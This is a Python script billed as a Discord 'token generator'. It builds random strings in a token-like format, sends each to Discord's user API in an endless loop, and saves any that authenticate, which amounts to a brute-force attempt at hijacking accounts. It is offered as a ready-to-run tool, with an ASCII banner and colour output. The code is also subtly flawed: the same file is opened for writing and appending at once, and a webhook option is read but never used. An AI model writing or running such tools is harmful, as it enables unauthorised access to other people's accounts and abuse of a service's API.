import requests
import random
import string
import os
import json

# Load config settings from config.json
with open('config.json') as config_file:
    config = json.load(config_file)

valid_tokens_file = config.get('valid_tokens_file', 'valid_token.txt')
send_to_webhook = config.get('send_to_webhook', False)

# Function to generate a random token
def generate_token():
    return "MT" + ''.join(random.choices(string.ascii_letters + string.digits, k=59))

# Function to validate token through Discord's API
def validate_token(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error validating token: {e}")
        return False

# Function to save valid tokens
def save_valid_token(token):
    with open(valid_tokens_file, 'a') as token_file:
        token_file.write(f"{token}\n")

# Function to save invalid tokens
def save_invalid_token(token):
    with open('tokens.txt', 'a') as token_file:
        token_file.write(f"{token}\n")

# Main function to generate and validate tokens continuously
def main():
    os.system("cls" if os.name == "nt" else "clear")  # Clear terminal

    # Directly show the token generation logo
    os.system("title TOKEN GEN - LEGIT DARK")  # Change terminal title
    print("""
  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
 ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
 ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
      ░    ░  ░         ░    ░  ░   ░           ░  ░            ░ ░     ░    
___________________________________________________________________________________ 
    """)

    with open('tokens.txt', 'w') as token_file:
        while True:
            token = generate_token()
            valid = validate_token(token)
            token_display = token[:30] + "***"  # Mask part of the token in the terminal

            if valid:
                print(f"\033[92m[+] Valid\033[0m > \033[97m{token_display}\033[0m")
                save_valid_token(token)
            else:
                print(f"\033[91m[-] Invalid\033[0m > \033[97m{token_display}\033[0m")
                save_invalid_token(token)
            
            token_file.write(f"{token}\n")

if __name__ == "__main__":
    main()
